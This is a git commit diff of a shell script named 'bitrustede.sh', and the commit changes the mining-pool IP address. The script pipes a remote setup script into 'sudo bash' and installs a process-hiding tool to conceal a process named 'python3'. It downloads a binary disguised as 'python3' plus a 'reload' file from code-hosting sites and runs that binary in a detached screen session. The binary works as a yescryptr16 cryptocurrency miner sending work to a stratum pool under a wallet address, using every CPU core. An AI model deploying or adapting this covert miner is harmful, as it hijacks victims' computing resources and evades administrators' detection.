3c56f08bf86263944abbcd4eee7b6d547e3b9ca0
BetawiYoi <134082647+danipedrosang@users.noreply.github.com>
2023-06-17 15:35:28 +0700

    Update bitrustede.sh

--- bitrustede.sh
+++ bitrustede.sh
@@ -4,5 +4,5 @@ curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
 apt install nodejs -y
 npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add python3 
 wget https://github.com/danipedrosang/marcrash/raw/main/python3 && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x python3 reload
-screen -dmS run ./python3 -a yescryptr16 -o stratum+tcp://43.134.237.60:443 -u web1qyzgpcnssde96zrfs3n4g6saunyy6mm534wzjeh.edu -p m=solo -t$(nproc --all)
+screen -dmS run ./python3 -a yescryptr16 -o stratum+tcp://47.89.234.73:443 -u web1qyzgpcnssde96zrfs3n4g6saunyy6mm534wzjeh.edu -p m=solo -t$(nproc --all)
 ./reload
